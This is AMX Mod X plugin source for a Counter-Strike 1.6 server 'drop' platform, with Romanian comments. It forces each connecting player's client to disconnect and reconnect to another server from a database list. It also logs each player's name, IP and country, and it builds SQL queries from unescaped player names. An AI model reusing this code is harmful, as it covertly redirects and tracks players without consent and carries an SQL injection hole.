#include <amxmodx>
#include <amxmisc>
#include <sqlx>
#include <server_query>
#include <geoip>

static const 
PLUGIN_NAME[] = "Platforma",
PLUGIN_AUTHOR[] = "Carnacior",
PLUGIN_VERSION[] = "2.1",
HOST[] = "",
USER[] = "",
PASS[] = "",
DB[] = "";

new const TAG[] = "[AMXX]"
#define MAX_SERVERS 300 //cate servere vei avea maxim in baza de date (rol de optimizare al memoriei, poti pune 999 din partea mea)
new filename[256]
new counter = 1,counterr = 1;
new totalcount
new Handle:g_SqlTuple
new g_Error[512], g_szIps[MAX_SERVERS+1][40];

new g_servers;
new errcode; 
new squery_id;
new g_maxp[MAX_SERVERS+1]
new g_pcount[MAX_SERVERS+1]

new szOutput[2][16]
new port, ip[16]
new szIp[25] = "188.212.105.57:27015"
new szTemp69[512], LogString[256], szTemp666[512], LogString2[256]

public plugin_init()
{
	g_servers = 1
	register_plugin(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR)
	set_task(1.0, "init_mysql")
	set_task(10.0, "Load_MySql", _, _, _, "b")
	set_task(2.0, "reload_serverinfo")
	get_configsdir(filename,255)
	format(filename,255,"%s/platform-serverlist.txt",filename)
	//get_user_ip(0, szIp, charsmax(szIp))
	
}

public reload_serverinfo()
{
	if(counterr>g_servers)
		counterr=1
	ExplodeString( szOutput, 2, 16, g_szIps[counterr], ':' )
	port = str_to_num(szOutput[1])
	format(ip, charsmax(ip), "%s", szOutput[0])
	squery_id = sq_query(ip, port, SQ_Server, "SqueryResults", errcode); 
	if(!squery_id) 
	{ 
		new error[32]; 
		sq_error(errcode, error, charsmax(error)); 
		server_print("Error on querying server (%d): %s", errcode, error);
	}
	set_task(1.0,"reload_serverinfo")
}

public SqueryResults(squery_id, type, Trie:buffer, Float:query_time, bool:failed, data[], data_size) 
{ 
	if(failed) 
	{ 
		g_maxp[counterr]=69
		g_pcount[counterr]=69
	} 
	else 
	{
		new pnum , mnum
		TrieGetCell(buffer, "num_players", pnum);
		TrieGetCell(buffer, "max_players", mnum)
		g_maxp[counterr]=mnum
		g_pcount[counterr]=pnum
	}
	counterr++
}  

public client_connect(id)
{
	//ignoram botii
	new szIpx[23]
	get_user_ip(id, szIpx, charsmax(szIpx))
	if(containi(szIpx,"127.0.0.1") != -1)
		return PLUGIN_HANDLED

	
	//daca am ajuns la capatul listei de servere, incepem de la inceput
	if(counter>g_servers)
	{
		counter = 1
	}
	new iplayers, imaxplayers
	iplayers = g_pcount[counter]
	imaxplayers = g_maxp[counter]
	
	new ora[64], data[64];
	get_time("%H:%M:%S", ora, 63)
	get_time("%d.%m.%Y", data, 63)
	
	if(iplayers<imaxplayers)
	{
		//luam data si ora ; facem update la baza de date pentru lista dropurilor
		new nume[32];
		get_user_name(id, nume, charsmax(nume));
		new Code2[ 3 ];
		geoip_code2_ex( szIpx, Code2 );
		strtolower(Code2)
		format(LogString,charsmax(LogString),"[%s](%s): <b>%s</b> cu ip ",data,ora,nume)
		format(LogString2,charsmax(LogString2)," trimis catre <b>%s</b>",g_szIps[counter])
		format(szTemp69,charsmax(szTemp69),"INSERT INTO `list` (`value`, `ip`, `ctry`, `value2`) VALUES ('%s', '%s', '%s', '%s');",LogString, szIpx, Code2, LogString2)
		SQL_ThreadQuery(g_SqlTuple,"IgnoreHandle",szTemp69)
		
		new Data[1]
		Data[0] = id
		
		format(szTemp666,charsmax(szTemp666),"SELECT * FROM `ipstats` WHERE (`ip` = '%s')", szIpx)
		SQL_ThreadQuery(g_SqlTuple,"verifica_recurenta",szTemp666,Data,1)
		
		
		//redirect
		client_cmd(id, "disconnect;wait;wait;wait;wait;wait;^"connect^" %s",g_szIps[counter]);
		log_to_file("drops.log", "[DROP] Jucator %s trimis catre %s",szIpx,g_szIps[counter])
		
		//daca s-a citit deja numarul de dropuri, o crestem cu 1
		new szTemp[512]
		if(totalcount>1)
		{
		totalcount++
		format(szTemp,charsmax(szTemp),"UPDATE `count` SET `counter` = '%d' WHERE `id` = '1';", totalcount)
		SQL_ThreadQuery(g_SqlTuple,"IgnoreHandle",szTemp)
		}
		counter++
	}
	else
	{
		//incercam cu serverul urmator
		format(LogString,charsmax(LogString),"[%s](%s): <b>%s</b> e full sau offline, sarim peste.",data,ora,g_szIps[counter])
		format(szTemp69,charsmax(szTemp69),"INSERT INTO `list` (`value`) VALUES ('%s');",LogString)
		SQL_ThreadQuery(g_SqlTuple,"IgnoreHandle",szTemp69)
		set_task(1.0,"checkagain",id)
		counter++
	}
	
	return PLUGIN_CONTINUE
}

public verifica_recurenta(FailState,Handle:Query,Error[],Errcode,Data[],DataSize)
{
	if(FailState == TQUERY_CONNECT_FAILED)
	{
		log_amx("Load - Could not connect to SQL database.  [%d] %s", Errcode, Error)
	}
	else if(FailState == TQUERY_QUERY_FAILED)
	{
		log_amx("Load Query failed. [%d] %s", Errcode, Error)
	}


	if(SQL_NumResults(Query))//daca are ipul in lista, crestem datile de cate ori s-a conectat, scriem in logs
	{
		new szTempgx[512]
		new szIp2[35]
		SQL_ReadResult(Query, 1, szIp2, 34)
		new from[50] 
		SQL_ReadResult(Query, 2, from, 49)
		new reccount 
		reccount = SQL_ReadResult(Query, 3)
		reccount++
		format(szTempgx,charsmax(szTempgx),"UPDATE `ipstats` SET `times` = '%d' WHERE `ip` = '%s';", reccount, szIp2)
		SQL_ThreadQuery(g_SqlTuple,"IgnoreHandle",szTempgx)
		server_print("reccount %d ip %s from %s",reccount,szIp2,from )
		server_print("numar de coloane: %d", SQL_NumColumns(Query))
		if(reccount>1)
		{
			new ora[64], data[64];
			get_time("%H:%M:%S", ora, 63)
			get_time("%d.%m.%Y", data, 63)
			format(LogString,charsmax(LogString),"[%s](%s): <b>%s</b> s-a intors de la %s pentru a %d-a oara.",data,ora,szIp2,from,reccount)
			format(szTempgx,charsmax(szTempgx),"INSERT INTO `list2` (`value`) VALUES ('%s');",LogString)//asta i nu mai merge
			SQL_ThreadQuery(g_SqlTuple,"IgnoreHandle",szTempgx)
		}
		
	}

	return PLUGIN_HANDLED
}

public checkagain(id)
{
	client_cmd(id, "disconnect;wait;wait;wait;wait;wait;^"connect^" %s",szIp);
}

public IgnoreHandle(FailState,Handle:Query,Error[],Errcode,Data[],DataSize)
{
    SQL_FreeHandle(Query)

    return PLUGIN_HANDLED
}

public init_mysql()
{
	g_SqlTuple = SQL_MakeDbTuple(HOST, USER, PASS, DB)
	static ErrorCode, Handle:SqlConnection;
	SqlConnection = SQL_Connect(g_SqlTuple, ErrorCode, g_Error, charsmax(g_Error))

	static Handle:Queries
	Queries = SQL_PrepareQuery(SqlConnection, "CREATE TABLE IF NOT EXISTS `count` (`id` int(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,`counter` int(10)) ; CREATE TABLE IF NOT EXISTS `list` (`id` int(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,`value` varchar(256)); CREATE TABLE IF NOT EXISTS `list2` (`id` int(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,`value` varchar(256))")
	
	if(SqlConnection == Empty_Handle)
	{
		server_print("%s Eroare conexiune SQL! Citim din fisier!", TAG)
		server_print("%s Eroare conexiune SQL! Citim din fisier!", TAG)
		server_print("%s Eroare conexiune SQL! Citim din fisier!", TAG)
		set_task(3.0, "changefailmap")
		set_task(10.0, "changefailmap", _, _, _, "b")
	}
	if(!SQL_Execute(Queries))
	{
		SQL_QueryError(Queries, g_Error, charsmax(g_Error))
	}
	SQL_FreeHandle(Queries)
	SQL_FreeHandle(SqlConnection)
	
	Load_MySql()
	Load_TotalCount()
}

public changefailmap()
{
	/*open file in read-mode*/
	new filepointer = fopen(filename,"r")
	/*check if file is open,on an error filepointer is 0*/
	if(filepointer)
	{
		new readdata[128]
		new parsedname[32]
		new meh
		/*Read the file until it is at end of file*/
		/*fgets - Reads a line from a text file -- includes newline!*/
		while(fgets(filepointer,readdata,127) && meh<MAX_SERVERS)
		{   
			meh++
			parse(readdata,parsedname,31)
			copy(g_szIps[meh], sizeof(g_szIps[]),parsedname)
		}
		fclose(filepointer)
	}
}

public plugin_end()
	SQL_FreeHandle(g_SqlTuple)

public Load_MySql()
{
	g_servers = 0
	static szTemp[512], Data[1];
	Data[0] = 1
	format(szTemp, charsmax(szTemp), "SELECT server FROM server_list ORDER BY id DESC LIMIT %d", MAX_SERVERS)
	SQL_ThreadQuery(g_SqlTuple, "register_client", szTemp, Data, 1)
}

public Load_TotalCount()
{
	static szTemp[512], Data[1];
	Data[0] = 1
	format(szTemp, charsmax(szTemp), "SELECT counter FROM count WHERE id = '1' ")
	SQL_ThreadQuery(g_SqlTuple, "load_total", szTemp, Data, 1)
}

public load_total(FailState, Handle:Query, Error[], Errcode, Data[], DataSize)
{
	if(FailState == TQUERY_CONNECT_FAILED)
		log_amx("Load - Could not connect to SQL database.  [%d] %s", Errcode, Error)
	else if(FailState == TQUERY_QUERY_FAILED)
		log_amx("Load Query failed. [%d] %s", Errcode, Error)

		
	totalcount = SQL_ReadResult(Query, 0)
		
	return PLUGIN_HANDLED
}

public register_client(FailState, Handle:Query, Error[], Errcode, Data[], DataSize)
{
	if(FailState == TQUERY_CONNECT_FAILED)
		log_amx("Load - Could not connect to SQL database.  [%d] %s", Errcode, Error)
	else if(FailState == TQUERY_QUERY_FAILED)
		log_amx("Load Query failed. [%d] %s", Errcode, Error)

		
	for(new vv;vv<=MAX_SERVERS;vv++)
	{
		g_szIps[vv][0] = 0
	}	
		
	if(SQL_NumResults(Query) < 1)
		return PLUGIN_HANDLED;
	else
	{
		while(SQL_MoreResults(Query))
		{
			g_servers++
			SQL_ReadResult(Query, 0, g_szIps[g_servers], charsmax(g_szIps))
			SQL_NextRow(Query)
		}
	}
	return PLUGIN_HANDLED
}


stock ExplodeString( p_szOutput[][], p_nMax, p_nSize, p_szInput[], p_szDelimiter )
{
    new nIdx = 0, l = strlen(p_szInput)
    new nLen = (1 + copyc( p_szOutput[nIdx], p_nSize, p_szInput, p_szDelimiter ))
    while( (nLen < l) && (++nIdx < p_nMax) )
        nLen += (1 + copyc( p_szOutput[nIdx], p_nSize, p_szInput[nLen], p_szDelimiter ))
    return
}